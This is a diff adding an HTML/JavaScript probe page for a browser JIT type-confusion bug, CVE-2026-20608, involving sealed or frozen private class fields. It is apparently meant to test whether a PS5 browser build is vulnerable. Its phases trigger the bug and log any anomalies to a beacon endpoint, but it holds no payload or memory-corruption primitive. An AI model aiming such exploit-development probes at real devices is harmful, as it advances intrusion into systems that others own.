@@ -1,0 +1,272 @@
+<!--
+  p671: CVE-2026-20608 — Private fields seal/freeze JIT type confusion
+  Fix: commit 672cdd3, Mar 3, 2026 (Safari 26.3, Feb 11, 2026)
+  PS5 cherry-pick cutoff: ~Feb 2026 — this is BORDERLINE
+  
+  Bug: Object.seal()/freeze() sets attributes on private field entries
+  in PropertyTable without triggering a structure transition. JITs assume
+  attribute changes always transition → stale structure info → type confusion.
+  
+  Phase A: verify private class fields (#field) syntax is supported
+  Phase B: exact regression test from commit (crash = vulnerable)
+  Phase C: exploit attempt — type confusion after seal + setField in JIT
+  Phase D: try to observe type confusion (read wrong property type)
+  
+  CRASH_CLASS: HIGH (JIT type confusion → potential crash)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p671</title></head>
+<body>p671: private fields seal/freeze
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function(){
+'use strict';
+var L=document.getElementById('log'),bQ=[];
+function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=1)flush();}
+function flush(){if(!bQ.length)return;var b=bQ.splice(0,2).join('|');try{var x=new XMLHttpRequest();x.open('GET','/beacon/P671-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+window.onerror=function(m){emit('ERR',String(m).slice(0,120));flush();};
+var f64=new Float64Array(1),u8=new Uint8Array(f64.buffer);
+function d2hex(d){f64[0]=d;var h='';for(var i=7;i>=0;i--)h+=('0'+u8[i].toString(16)).slice(-2);return h;}
+
+emit('START','v1');flush();
+
+// ================================================================
+// PHASE A: verify private fields syntax support
+// ================================================================
+emit('A','private-fields-check');
+try{
+  var supported=false;
+  try{
+    eval('class _Test { #x; constructor(){this.#x=1;} get(){return this.#x;} }; new _Test().get();');
+    supported=true;
+  }catch(e){
+    emit('A-SYNTAX','private fields NOT supported: '+e.name);
+  }
+  emit('A-RESULT','supported='+supported);
+  if(!supported){emit('A-VERDICT','SKIP — no private fields');flush();return;}
+}catch(e){emit('A-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE B: exact regression test from commit
+// If vulnerable: crash or unexpected behavior during setField after seal
+// If patched: completes normally (10000 iterations, no crash)
+// ================================================================
+emit('B','regression-test');
+try{
+  // Use eval to avoid syntax error on engines without private fields
+  var testCode = '(' + function(){
+    // B1: seal test
+    var C1 = eval('(class { #field; setField(v){this.#field=v;} getField(){return this.#field;} })');
+    for(var i=0;i<10000;i++){
+      var c=new C1();
+      Object.seal(c);
+      c.setField(i);
+    }
+    return 'seal-ok';
+  }.toString() + ')()';
+  
+  var sealResult=eval(testCode);
+  emit('B1-SEAL',sealResult);flush();
+
+  // B2: freeze test
+  var testCode2 = '(' + function(){
+    var C2 = eval('(class { #field; setField(v){this.#field=v;} getField(){return this.#field;} })');
+    for(var i=0;i<10000;i++){
+      var c=new C2();
+      Object.freeze(c);
+      c.setField(i);
+    }
+    return 'freeze-ok';
+  }.toString() + ')()';
+
+  var freezeResult=eval(testCode2);
+  emit('B2-FREEZE',freezeResult);flush();
+
+  emit('B-VERDICT','SURVIVED — both seal and freeze completed 10K iterations');
+}catch(e){
+  emit('B-ERR',e.name+':'+e.message);
+  if(e.name==='TypeError'||e.name==='RangeError'){
+    emit('B-VERDICT','THREW-'+e.name+' — might indicate type confusion caught by runtime');
+  } else {
+    emit('B-VERDICT','UNEXPECTED-ERROR');
+  }
+}
+flush();
+
+// ================================================================
+// PHASE C: deeper type confusion test
+// After seal, the JIT may use stale structure info. Try to observe:
+// 1. Read a property that changed type due to structure mismatch
+// 2. Get a wrong value back (number as object, etc.)
+// ================================================================
+emit('C','type-confusion-observe');
+try{
+  var cCode = '(' + function(){
+    var results=[];
+    var C3 = eval('(class { #priv; pub; constructor(p,q){this.#priv=p;this.pub=q;} setPrv(v){this.#priv=v;} getPrv(){return this.#priv;} })');
+
+    // Warm the JIT with unsealed objects
+    for(var i=0;i<5000;i++){
+      var c=new C3(i, i*2);
+      c.setPrv(i+1);
+      c.getPrv();
+    }
+
+    // Now seal and set — JIT compiled code may use wrong structure
+    for(var i=0;i<5000;i++){
+      var c=new C3(100,200);
+      Object.seal(c);
+      c.setPrv(999);
+      var got=c.getPrv();
+      if(got!==999) results.push({i:i,expected:999,got:got,type:typeof got});
+    }
+
+    // Also test: freeze then set private field
+    for(var i=0;i<5000;i++){
+      var c=new C3(100,200);
+      Object.freeze(c);
+      c.setPrv(888);
+      var got=c.getPrv();
+      // On vulnerable: setPrv might silently fail or corrupt
+      if(got!==888) results.push({i:i+5000,expected:888,got:got,type:typeof got});
+    }
+
+    return results;
+  }.toString() + ')()';
+
+  var confResults=eval(cCode);
+  emit('C-RESULT','mismatches='+confResults.length);
+  for(var k=0;k<Math.min(confResults.length,10);k++){
+    var r=confResults[k];
+    emit('C-MISMATCH','i='+r.i+',exp='+r.expected+',got='+r.got+',type='+r.type);
+  }
+  if(confResults.length>0){
+    emit('C-VERDICT','TYPE-CONFUSION-DETECTED — '+confResults.length+' wrong values!');
+  } else {
+    emit('C-VERDICT','all-correct (patched or JIT not confused)');
+  }
+}catch(e){emit('C-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE D: structure transition detection
+// Check if seal/freeze changes the object's hidden class / structure
+// ================================================================
+emit('D','structure-transition');
+try{
+  var dCode = '(' + function(){
+    var C4 = eval('(class { #f; x; constructor(){this.#f=0;this.x=0;} set(v){this.#f=v;} get(){return this.#f;} })');
+    var results=[];
+
+    // Create two objects from same class
+    var a=new C4();
+    var b=new C4();
+
+    // They should have same structure initially
+    // We can detect structure changes by checking if property access is monomorphic
+    // Use JSON.stringify as a proxy — same structure = same key order
+
+    var keysA=JSON.stringify(Object.getOwnPropertyNames(a));
+    Object.seal(a);
+    var keysAsealed=JSON.stringify(Object.getOwnPropertyNames(a));
+    var keysB=JSON.stringify(Object.getOwnPropertyNames(b));
+
+    results.push({before:keysA,sealed:keysAsealed,unsealed:keysB});
+
+    // Check if sealed object's pub property is writable
+    var wasWritable=true;
+    try{a.x=42;}catch(e){wasWritable=false;}
+    results.push({sealedWritable:wasWritable,val:a.x});
+
+    // Check frozen
+    var c=new C4();
+    Object.freeze(c);
+    var frozenWritable=true;
+    try{c.x=42;}catch(e){frozenWritable=false;}
+    results.push({frozenWritable:frozenWritable,val:c.x});
+
+    // Check private field after freeze — spec says private fields are NOT affected
+    c.set(777);
+    results.push({frozenPrivate:c.get()});
+
+    return results;
+  }.toString() + ')()';
+
+  var dResults=eval(dCode);
+  for(var k=0;k<dResults.length;k++){
+    emit('D-'+k,JSON.stringify(dResults[k]));
+  }
+
+  // The key question: does private field write work after freeze?
+  // Spec: YES (private fields aren't properties). Bug: attributes might be wrong.
+  if(dResults[3] && dResults[3].frozenPrivate===777){
+    emit('D-VERDICT','private-write-after-freeze-WORKS (expected per spec)');
+  } else {
+    emit('D-VERDICT','private-write-after-freeze-FAILED val='+JSON.stringify(dResults[3]));
+  }
+}catch(e){emit('D-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE E: aggressive JIT confusion — mix sealed/unsealed in hot loop
+// The JIT inlines based on structure seen during profiling.
+// If seal doesn't transition, the IC hits the wrong code path.
+// ================================================================
+emit('E','aggressive-jit-mix');
+try{
+  var eCode = '(' + function(){
+    var C5 = eval('(class { #v; constructor(n){this.#v=n;} bump(){this.#v=this.#v+1;return this.#v;} })');
+    var anomalies=[];
+
+    function hotBump(obj){
+      return obj.bump();
+    }
+
+    // Warm with normal objects
+    for(var i=0;i<5000;i++){
+      hotBump(new C5(i));
+    }
+
+    // Now alternate sealed and unsealed — confuse JIT IC
+    for(var i=0;i<5000;i++){
+      var obj=new C5(i);
+      if(i%2===0) Object.seal(obj);
+      var result=hotBump(obj);
+      var expected=i+1;
+      if(result!==expected){
+        anomalies.push({i:i,sealed:i%2===0,exp:expected,got:result,type:typeof result,hex:typeof result==='number'?'0x'+result.toString(16):'N/A'});
+      }
+    }
+
+    // Same with freeze
+    for(var i=0;i<5000;i++){
+      var obj=new C5(i);
+      if(i%3===0) Object.freeze(obj);
+      var result=hotBump(obj);
+      var expected=i+1;
+      if(result!==expected){
+        anomalies.push({i:i+5000,frozen:i%3===0,exp:expected,got:result,type:typeof result});
+      }
+    }
+
+    return anomalies;
+  }.toString() + ')()';
+
+  var eResults=eval(eCode);
+  emit('E-RESULT','anomalies='+eResults.length);
+  for(var k=0;k<Math.min(eResults.length,10);k++){
+    emit('E-ANOM',JSON.stringify(eResults[k]).slice(0,120));
+  }
+  if(eResults.length>0){
+    emit('E-VERDICT','JIT-CONFUSION — '+eResults.length+' wrong results!');
+  } else {
+    emit('E-VERDICT','all-correct');
+  }
+}catch(e){emit('E-ERR',e.name+':'+e.message);}
+flush();
+
+emit('DONE','p671-complete');flush();
+})();
+</script>
+</body>
+</html>
